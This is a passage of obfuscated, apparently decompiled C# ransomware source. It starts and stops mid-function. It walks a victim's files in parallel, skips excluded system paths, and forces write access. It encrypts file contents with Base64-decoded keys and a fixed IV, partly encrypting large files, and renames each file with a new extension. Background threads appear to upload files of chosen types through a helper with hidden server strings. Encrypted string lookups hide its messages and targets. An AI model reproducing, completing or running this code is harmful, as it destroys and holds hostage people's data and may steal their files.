												edWBraEVjZnwU(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN, CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD, Convert.FromBase64String(CS_0024_003C_003E8__locals0.kEFVKbULbQeU));
											}
										}
										else
										{
											try
											{
												if (!MFCrMNyVwftIF)
												{
													yWogjCIsHMw(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN, CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD, cjnjoiIOwY, Convert.FromBase64String(HZePHYGbpexu));
												}
												else
												{
													yWogjCIsHMw(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN, CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD, Convert.FromBase64String(CS_0024_003C_003E8__locals0.kEFVKbULbQeU), Convert.FromBase64String(HZePHYGbpexu));
												}
											}
											catch (Exception ex14)
											{
												if (hIFJbdEMJudY)
												{
													try
													{
														File.AppendAllText(LImNkSPhwOOQHW, HbGtZiKmUw.getString_0(107387444) + CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + HbGtZiKmUw.getString_0(107386695) + ex14.Message + HbGtZiKmUw.getString_0(107395828));
													}
													catch (Exception)
													{
													}
												}
												gmdqiJfLiKSG++;
												try
												{
													File.Move(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD, CS_0024_003C_003E8__locals1.ksJAkzHcZyIN);
												}
												catch (Exception)
												{
												}
												goto end_IL_08d1;
											}
										}
									}
									else if (!wRVzxmISkhBzKR)
									{
										if (!MFCrMNyVwftIF)
										{
											edWBraEVjZnwU(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN, CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + HbGtZiKmUw.getString_0(107386672), cjnjoiIOwY);
										}
										else
										{
											edWBraEVjZnwU(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN, CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + HbGtZiKmUw.getString_0(107386672), Convert.FromBase64String(CS_0024_003C_003E8__locals0.kEFVKbULbQeU));
										}
									}
									else
									{
										try
										{
											if (!MFCrMNyVwftIF)
											{
												yWogjCIsHMw(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN, CS_0024_003C_003E8__locals1.ksJAkzHcZyIN, cjnjoiIOwY, Convert.FromBase64String(HZePHYGbpexu));
											}
											else
											{
												yWogjCIsHMw(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN, CS_0024_003C_003E8__locals1.ksJAkzHcZyIN, Convert.FromBase64String(CS_0024_003C_003E8__locals0.kEFVKbULbQeU), Convert.FromBase64String(HZePHYGbpexu));
											}
										}
										catch (Exception ex14)
										{
											if (hIFJbdEMJudY)
											{
												try
												{
													File.AppendAllText(LImNkSPhwOOQHW, HbGtZiKmUw.getString_0(107387444) + CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + HbGtZiKmUw.getString_0(107386695) + ex14.Message + HbGtZiKmUw.getString_0(107395828));
												}
												catch (Exception)
												{
												}
											}
											gmdqiJfLiKSG++;
											goto end_IL_08d1;
										}
									}
									if (MFCrMNyVwftIF)
									{
										if (CS_0024_003C_003E8__locals0.UfgTUBLEANxCD != HbGtZiKmUw.getString_0(107386677))
										{
											oQVgdpANcfhNxO(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD, bytes2);
										}
										else
										{
											oQVgdpANcfhNxO(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN, bytes2);
										}
									}
									goto IL_10d8;
								}
								CS_0024_003C_003E8__locals0 = new HbGtZiKmUw.vljTfCIVJtKHSZF();
								CS_0024_003C_003E8__locals0.wQAMPOiVfhK = CS_0024_003C_003E8__locals1;
								CS_0024_003C_003E8__locals0.tkdfLXnvtaLVtT = CS_0024_003C_003E8__locals0;
								try
								{
									if (CS_0024_003C_003E8__locals0.UfgTUBLEANxCD != HbGtZiKmUw.getString_0(107386677))
									{
										if (eSjMTjCatON)
										{
											CS_0024_003C_003E8__locals0.UfgTUBLEANxCD = BBDxmQurRdVswG + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD;
										}
										File.Move(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN, CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD);
									}
								}
								catch (Exception ex14)
								{
									if (hIFJbdEMJudY)
									{
										try
										{
											File.AppendAllText(LImNkSPhwOOQHW, HbGtZiKmUw.getString_0(107387444) + CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + HbGtZiKmUw.getString_0(107412922) + ex14.Message + HbGtZiKmUw.getString_0(107395828));
										}
										catch (Exception)
										{
										}
									}
									gmdqiJfLiKSG++;
									goto end_IL_08d1;
								}
								CS_0024_003C_003E8__locals0.gJazcLYPjvD = HbGtZiKmUw.getString_0(107389104);
								if (CS_0024_003C_003E8__locals0.UfgTUBLEANxCD != HbGtZiKmUw.getString_0(107386677))
								{
									CS_0024_003C_003E8__locals0.gJazcLYPjvD = CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD;
								}
								else
								{
									CS_0024_003C_003E8__locals0.gJazcLYPjvD = CS_0024_003C_003E8__locals1.ksJAkzHcZyIN;
								}
								if (CMdYdSoRLCrMajhb == HbGtZiKmUw.getString_0(107396877))
								{
									Thread thread4 = new Thread((ThreadStart)delegate
									{
										foreach (string item in hHDzREQRrQkqjKe)
										{
											if (CS_0024_003C_003E8__locals0.gJazcLYPjvD.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.tkdfLXnvtaLVtT.UfgTUBLEANxCD) && TQwKQbvIHjGUX == HbGtZiKmUw.vljTfCIVJtKHSZF.getString_0(107396884))
											{
												if (Convert.ToInt32(wlgCZFnHvCei) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.gJazcLYPjvD).Length)
												{
													try
													{
														ySVDzMAbizHUS.FvMtDCdFtDGVbzA(HbGtZiKmUw.vljTfCIVJtKHSZF.getString_0(107389224), HbGtZiKmUw.vljTfCIVJtKHSZF.getString_0(107389187), HbGtZiKmUw.vljTfCIVJtKHSZF.getString_0(107389174), CS_0024_003C_003E8__locals0.gJazcLYPjvD);
													}
													catch
													{
													}
												}
											}
											else if (CS_0024_003C_003E8__locals0.gJazcLYPjvD.ToLower().EndsWith(item) && TQwKQbvIHjGUX == HbGtZiKmUw.vljTfCIVJtKHSZF.getString_0(107396707))
											{
												try
												{
													ySVDzMAbizHUS.FvMtDCdFtDGVbzA(HbGtZiKmUw.vljTfCIVJtKHSZF.getString_0(107389224), HbGtZiKmUw.vljTfCIVJtKHSZF.getString_0(107389187), HbGtZiKmUw.vljTfCIVJtKHSZF.getString_0(107389174), CS_0024_003C_003E8__locals0.gJazcLYPjvD);
												}
												catch
												{
												}
											}
										}
									});
									thread4.Priority = ThreadPriority.Normal;
									thread4.IsBackground = false;
									thread4.Start();
								}
								bytes2 = Encoding.ASCII.GetBytes(jdzEbvPutazU);
								if (iHEcKVZxNihtAo == HbGtZiKmUw.getString_0(107396700))
								{
									byte[] array2 = null;
									byte[] byte_2 = zuVeojPvzZvsAuYXeg.eiVZeDjgvjzXx(CS_0024_003C_003E8__locals0.gJazcLYPjvD, Convert.ToInt32(ybUSgcGwjKebC) * 1024 * 1024);
									if (zuVeojPvzZvsAuYXeg.efnMlvSzfC(RJbBOzKoWoPeh: (!OIyyeuNoRzhHTwe) ? (MFCrMNyVwftIF ? zuVeojPvzZvsAuYXeg.rhGTroEfaFqc(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.kEFVKbULbQeU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : zuVeojPvzZvsAuYXeg.rhGTroEfaFqc(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.kEFVKbULbQeU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (MFCrMNyVwftIF ? GGGzGnJbALqDB.ofyMhRiGkVjut(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.kEFVKbULbQeU), Convert.FromBase64String(HZePHYGbpexu)) : GGGzGnJbALqDB.ofyMhRiGkVjut(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.kEFVKbULbQeU), Convert.FromBase64String(HZePHYGbpexu))), CijILhJAqDGY: CS_0024_003C_003E8__locals0.gJazcLYPjvD, opeYgyFjaEFL: bytes2))
									{
										goto IL_10d8;
									}
									try
									{
										File.Move(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD, CS_0024_003C_003E8__locals1.ksJAkzHcZyIN);
									}
									catch (Exception)
									{
									}
								}
								else if (!MFCrMNyVwftIF)
								{
									if (WngNyaOwcSGdLP.MaLriMjWjsJEaP(CS_0024_003C_003E8__locals0.gJazcLYPjvD, ybUSgcGwjKebC, CS_0024_003C_003E8__locals0.kEFVKbULbQeU, null, Convert.FromBase64String(HZePHYGbpexu)))
									{
										goto IL_10d8;
									}
									try
									{
										File.Move(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD, CS_0024_003C_003E8__locals1.ksJAkzHcZyIN);
									}
									catch (Exception)
									{
									}
								}
								else
								{
									if (WngNyaOwcSGdLP.MaLriMjWjsJEaP(CS_0024_003C_003E8__locals0.gJazcLYPjvD, ybUSgcGwjKebC, CS_0024_003C_003E8__locals0.kEFVKbULbQeU, bytes2, Convert.FromBase64String(HZePHYGbpexu)))
									{
										goto IL_10d8;
									}
									try
									{
										File.Move(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD, CS_0024_003C_003E8__locals1.ksJAkzHcZyIN);
									}
									catch (Exception)
									{
									}
								}
								end_IL_08d1:;
							}
							catch (Exception)
							{
								goto IL_10d8;
							}
						}
					}
					continue;
					IL_10d8:
					CS_0024_003C_003E8__locals0.XZRDbtNRlUBUa.Remove(CS_0024_003C_003E8__locals1.ksJAkzHcZyIN);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.XZRDbtNRlUBUa, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new HbGtZiKmUw.HLVtOJtcIkZeWP();
			CS_0024_003C_003E8__locals0.tkdfLXnvtaLVtT = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.ksJAkzHcZyIN = string_0;
			if (((!CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107388962)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107388937)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107388904)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.ToLower().Contains(HbGtZiKmUw.getString_0(107388855)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.ToLower().Contains(HbGtZiKmUw.getString_0(107388874)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107388817)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107388284)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.ToLower().Contains(HbGtZiKmUw.getString_0(107388271)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.ToLower().Contains(HbGtZiKmUw.getString_0(107388290)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.ToLower().Contains(HbGtZiKmUw.getString_0(107388253)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.ToLower().Contains(HbGtZiKmUw.getString_0(107388212)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.ToLower().Contains(HbGtZiKmUw.getString_0(107388227)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.ToLower().Contains(HbGtZiKmUw.getString_0(107388201)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.ToLower().Contains(HbGtZiKmUw.getString_0(107388148))) || CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(XtEtTgUvwHGMW(HbGtZiKmUw.getString_0(107388123)))) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107388082)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107388097)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107388048)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107388063)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107388526)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107388541)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107388524)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107388475)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107388462)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107388441)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.ToLower().Contains(HbGtZiKmUw.getString_0(107388460)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.ToLower().Contains(HbGtZiKmUw.getString_0(107388447)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.ToLower().Contains(HbGtZiKmUw.getString_0(107388398)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.ToLower().Contains(HbGtZiKmUw.getString_0(107388413)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(XtEtTgUvwHGMW(HbGtZiKmUw.getString_0(107388396))) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107388339)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107388358)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107396381)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107388313)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.EndsWith(CS_0024_003C_003E8__locals0.UfgTUBLEANxCD) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.EndsWith(HbGtZiKmUw.getString_0(107388320)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.EndsWith(HbGtZiKmUw.getString_0(107387771)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.EndsWith(HbGtZiKmUw.getString_0(107387766)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.EndsWith(HbGtZiKmUw.getString_0(107387761)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(HbGtZiKmUw.getString_0(107387788)) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(rwyuADDQdblNA) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(LImNkSPhwOOQHW) && !CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.Contains(mqQgvSYgrlnpSvAge))
			{
				if (CS_0024_003C_003E8__locals0.JzXWXIIovwkoW.Length != 0)
				{
					string[] jzXWXIIovwkoW = CS_0024_003C_003E8__locals0.JzXWXIIovwkoW;
					int num = 0;
					while (num < jzXWXIIovwkoW.Length)
					{
						string value = jzXWXIIovwkoW[num];
						if (!CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_1055;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.EndsWith(CS_0024_003C_003E8__locals0.UfgTUBLEANxCD))
					{
						goto IL_1055;
					}
				}
				catch (Exception)
				{
					goto IL_1055;
				}
				if (!lBBLtRfPsPV.Contains(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN))
				{
					if (mdbUrlsnzSwt == HbGtZiKmUw.getString_0(107396877))
					{
						try
						{
							if (dHuTNVWgMqhChXsi.uwHkPSlbEdqzd(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN))
							{
								dHuTNVWgMqhChXsi.YaBImKBJBjtLtc(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
							}
						}
						catch
						{
						}
					}
					lBBLtRfPsPV.Add(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
					Thread thread = new Thread((ThreadStart)delegate
					{
						try
						{
							if (qqVKUcwYqRObMU)
							{
								Console.WriteLine(HbGtZiKmUw.HLVtOJtcIkZeWP.getString_0(107412355) + CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + HbGtZiKmUw.HLVtOJtcIkZeWP.getString_0(107412764) + new FileInfo(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN).Length + HbGtZiKmUw.HLVtOJtcIkZeWP.getString_0(107412775));
								Console.WriteLine(HbGtZiKmUw.HLVtOJtcIkZeWP.getString_0(107412362), lBBLtRfPsPV.Count, DnHtYVwZFeaR, gmdqiJfLiKSG);
								Console.WriteLine(HbGtZiKmUw.HLVtOJtcIkZeWP.getString_0(107412305), UNPGQjVMpE.Elapsed);
								Console.WriteLine(HbGtZiKmUw.HLVtOJtcIkZeWP.getString_0(107412734));
							}
						}
						catch
						{
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (!rEUVMKgscr.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN)))
					{
						rEUVMKgscr.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN));
					}
					BHcaTUPjYtf(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
					try
					{
						new dfEMPHnLgeI().KIkInStTZGC(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (qqVKUcwYqRObMU)
								{
									Console.WriteLine(HbGtZiKmUw.getString_0(107412831) + CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + HbGtZiKmUw.getString_0(107412754) + new FileInfo(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN).Length + HbGtZiKmUw.getString_0(107412765));
									Console.WriteLine(HbGtZiKmUw.getString_0(107412724));
								}
							}
							catch
							{
							}
							spDXxUcNpZnQ(XtEtTgUvwHGMW(HbGtZiKmUw.getString_0(107412651)), HbGtZiKmUw.getString_0(107387672) + CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + HbGtZiKmUw.getString_0(107387672) + XtEtTgUvwHGMW(HbGtZiKmUw.getString_0(107413106)) + HbGtZiKmUw.getString_0(107387672) + Environment.UserName + HbGtZiKmUw.getString_0(107387672) + XtEtTgUvwHGMW(HbGtZiKmUw.getString_0(107413121)));
						}
					}
					catch (Exception ex2)
					{
						if (hIFJbdEMJudY)
						{
							try
							{
								File.AppendAllText(LImNkSPhwOOQHW, HbGtZiKmUw.getString_0(107387444) + CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + HbGtZiKmUw.getString_0(107413096) + ex2.Message + HbGtZiKmUw.getString_0(107395828));
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN).Length != 0L)
							{
								goto end_IL_089f;
							}
							goto end_IL_089e;
							end_IL_089f:;
						}
						catch (Exception ex2)
						{
							if (hIFJbdEMJudY)
							{
								try
								{
									File.AppendAllText(LImNkSPhwOOQHW, HbGtZiKmUw.getString_0(107387444) + CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + HbGtZiKmUw.getString_0(107412983) + ex2.Message + HbGtZiKmUw.getString_0(107395828));
								}
								catch (Exception)
								{
								}
							}
							gmdqiJfLiKSG++;
							goto end_IL_089e;
						}
						if (ZTtOBFIFhDPJ == HbGtZiKmUw.getString_0(107396877) && new FileInfo(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN).Length > Convert.ToInt32(ybUSgcGwjKebC) * 1024 * 1024)
						{
							try
							{
								if (CS_0024_003C_003E8__locals0.UfgTUBLEANxCD != HbGtZiKmUw.getString_0(107386677))
								{
									if (eSjMTjCatON)
									{
										CS_0024_003C_003E8__locals0.UfgTUBLEANxCD = BBDxmQurRdVswG + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD;
									}
									File.Move(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD);
								}
							}
							catch (Exception ex2)
							{
								if (hIFJbdEMJudY)
								{
									try
									{
										File.AppendAllText(LImNkSPhwOOQHW, HbGtZiKmUw.getString_0(107387444) + CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + HbGtZiKmUw.getString_0(107412922) + ex2.Message + HbGtZiKmUw.getString_0(107395828));
									}
									catch (Exception)
									{
									}
								}
								gmdqiJfLiKSG++;
								return;
							}
							if (CS_0024_003C_003E8__locals0.UfgTUBLEANxCD != HbGtZiKmUw.getString_0(107386677))
							{
								CS_0024_003C_003E8__locals0.ksJAkzHcZyIN += CS_0024_003C_003E8__locals0.UfgTUBLEANxCD;
							}
							if (CMdYdSoRLCrMajhb == HbGtZiKmUw.getString_0(107396877))
							{
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									foreach (string item2 in hHDzREQRrQkqjKe)
									{
										if (CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.tkdfLXnvtaLVtT.UfgTUBLEANxCD) && TQwKQbvIHjGUX == HbGtZiKmUw.HLVtOJtcIkZeWP.getString_0(107396887))
										{
											if (Convert.ToInt32(wlgCZFnHvCei) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN).Length)
											{
												try
												{
													ySVDzMAbizHUS.FvMtDCdFtDGVbzA(HbGtZiKmUw.HLVtOJtcIkZeWP.getString_0(107389227), HbGtZiKmUw.HLVtOJtcIkZeWP.getString_0(107389190), HbGtZiKmUw.HLVtOJtcIkZeWP.getString_0(107389177), CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.ksJAkzHcZyIN.ToLower().EndsWith(item2) && TQwKQbvIHjGUX == HbGtZiKmUw.HLVtOJtcIkZeWP.getString_0(107396710))
										{
											try
											{
												ySVDzMAbizHUS.FvMtDCdFtDGVbzA(HbGtZiKmUw.HLVtOJtcIkZeWP.getString_0(107389227), HbGtZiKmUw.HLVtOJtcIkZeWP.getString_0(107389190), HbGtZiKmUw.HLVtOJtcIkZeWP.getString_0(107389177), CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
											}
											catch
											{
											}
										}
									}
								});
								thread2.IsBackground = false;
								thread2.Priority = ThreadPriority.Normal;
								thread2.Start();
							}
							byte[] bytes = Encoding.ASCII.GetBytes(jdzEbvPutazU);
							if (iHEcKVZxNihtAo == HbGtZiKmUw.getString_0(107396700))
							{
								byte[] array = null;
								byte[] byte_ = zuVeojPvzZvsAuYXeg.eiVZeDjgvjzXx(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, Convert.ToInt32(ybUSgcGwjKebC) * 1024 * 1024);
								if (!zuVeojPvzZvsAuYXeg.efnMlvSzfC(RJbBOzKoWoPeh: (!OIyyeuNoRzhHTwe) ? (MFCrMNyVwftIF ? zuVeojPvzZvsAuYXeg.rhGTroEfaFqc(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.kEFVKbULbQeU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : zuVeojPvzZvsAuYXeg.rhGTroEfaFqc(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.kEFVKbULbQeU), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (MFCrMNyVwftIF ? GGGzGnJbALqDB.ofyMhRiGkVjut(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.kEFVKbULbQeU), Convert.FromBase64String(HZePHYGbpexu)) : GGGzGnJbALqDB.ofyMhRiGkVjut(byte_, Convert.FromBase64String(CS_0024_003C_003E8__locals0.kEFVKbULbQeU), Convert.FromBase64String(HZePHYGbpexu))), CijILhJAqDGY: CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, opeYgyFjaEFL: bytes))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!MFCrMNyVwftIF)
							{
								if (!WngNyaOwcSGdLP.MaLriMjWjsJEaP(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, ybUSgcGwjKebC, CS_0024_003C_003E8__locals0.kEFVKbULbQeU, null, Convert.FromBase64String(HZePHYGbpexu)))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!WngNyaOwcSGdLP.MaLriMjWjsJEaP(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, ybUSgcGwjKebC, CS_0024_003C_003E8__locals0.kEFVKbULbQeU, bytes, Convert.FromBase64String(HZePHYGbpexu)))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (eSjMTjCatON)
							{
								CS_0024_003C_003E8__locals0.UfgTUBLEANxCD = BBDxmQurRdVswG + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD;
							}
							byte[] bytes = Encoding.ASCII.GetBytes(jdzEbvPutazU);
							if (CS_0024_003C_003E8__locals0.UfgTUBLEANxCD != HbGtZiKmUw.getString_0(107386677))
							{
								if (!wRVzxmISkhBzKR)
								{
									if (!MFCrMNyVwftIF)
									{
										edWBraEVjZnwU(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD, cjnjoiIOwY);
									}
									else
									{
										edWBraEVjZnwU(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD, Convert.FromBase64String(CS_0024_003C_003E8__locals0.kEFVKbULbQeU));
									}
								}
								else
								{
									try
									{
										if (!MFCrMNyVwftIF)
										{
											yWogjCIsHMw(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD, cjnjoiIOwY, Convert.FromBase64String(HZePHYGbpexu));
										}
										else
										{
											yWogjCIsHMw(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD, Convert.FromBase64String(CS_0024_003C_003E8__locals0.kEFVKbULbQeU), Convert.FromBase64String(HZePHYGbpexu));
										}
									}
									catch (Exception ex2)
									{
										if (hIFJbdEMJudY)
										{
											try
											{
												File.AppendAllText(LImNkSPhwOOQHW, HbGtZiKmUw.getString_0(107387444) + CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + HbGtZiKmUw.getString_0(107386695) + ex2.Message + HbGtZiKmUw.getString_0(107395828));
											}
											catch (Exception)
											{
											}
										}
										gmdqiJfLiKSG++;
										try
										{
											File.Move(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + CS_0024_003C_003E8__locals0.UfgTUBLEANxCD, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!wRVzxmISkhBzKR)
							{
								if (!MFCrMNyVwftIF)
								{
									edWBraEVjZnwU(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + HbGtZiKmUw.getString_0(107386672), cjnjoiIOwY);
								}
								else
								{
									edWBraEVjZnwU(CS_0024_003C_003E8__locals0.ksJAkzHcZyIN, CS_0024_003C_003E8__locals0.ksJAkzHcZyIN + HbGtZiKmUw.getString_0(107386672), Convert.FromBase64String(CS_0024_003C_003E8__locals0.kEFVKbULbQeU));
								}
							}
							else
							{
								try
								{
									if (!MFCrMNyVwftIF)
									{
